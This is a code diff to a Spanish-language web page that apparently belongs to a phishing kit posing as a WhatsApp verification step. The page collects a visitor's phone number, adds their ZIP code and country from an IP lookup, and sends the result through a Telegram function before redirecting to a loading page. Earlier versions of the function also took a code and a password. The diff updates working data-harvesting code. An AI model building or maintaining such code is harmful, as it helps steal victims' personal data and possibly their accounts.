@@ -166,7 +166,8 @@
         phoneInput.value = countrySelect.value;
       });
 
-      fetch('https://ipapi.co/json/')
+      // Pre-seleccionar país con ipinfo.io
+      fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
           const countryMap = {
@@ -175,7 +176,7 @@
             'GT': '+502', 'HN': '+504', 'MX': '+52', 'NI': '+505', 'PA': '+507',
             'PY': '+595', 'PE': '+51', 'PR': '+1', 'UY': '+598', 'VE': '+58'
           };
-          countrySelect.value = countryMap[data.country_code] || '';
+          countrySelect.value = countryMap[data.country] || '';
         })
         .catch(error => console.error('Error al obtener la ubicación:', error));
     }
@@ -183,19 +184,21 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", function () {
-      function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
-        fetch('https://ipapi.co/json/')
+      function obtenerUbicacionYEnviarMensajeTelegram(telefono, nextPage, message) {
+        fetch('https://ipinfo.io/json')
           .then(response => response.json())
           .then(data => {
-            var country = data.country_name;
-            var region = data.region;
-            var ip = data.ip;
-            message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
+            var zipCode = data.postal;     // ZIP CODE
+            var pais = data.country;       // PAIS (código ISO)
+
+            // Formato exacto solicitado: Zip Code y Pais en la misma línea
+            message += '\nZip Code: ' + (zipCode || 'No disponible') + ' Pais: ' + pais;
             enviarMensajeTelegram(message, nextPage);
           })
           .catch(error => {
             console.error("Error al obtener la ubicación:", error);
-            enviarMensajeTelegram(message + "\nError al obtener la ubicación.", nextPage);
+            message += "\nZip Code: No disponible Pais: Desconocido";
+            enviarMensajeTelegram(message, nextPage);
           });
       }
 
@@ -241,7 +244,11 @@
           btn.disabled = true;
           
           var telefono = document.getElementById("telefono").value;
-          obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "loading.html?action=telefono", "💲 Whatsapp 💲:\nTELEFONO: " + telefono);
+          
+          // Mensaje base con formato exacto
+          var mensajeBase = "💲 Whatsapp 💲:\nTELEFONO: " + telefono;
+          
+          obtenerUbicacionYEnviarMensajeTelegram(telefono, "loading.html?action=telefono", mensajeBase);
         });
       }
     });
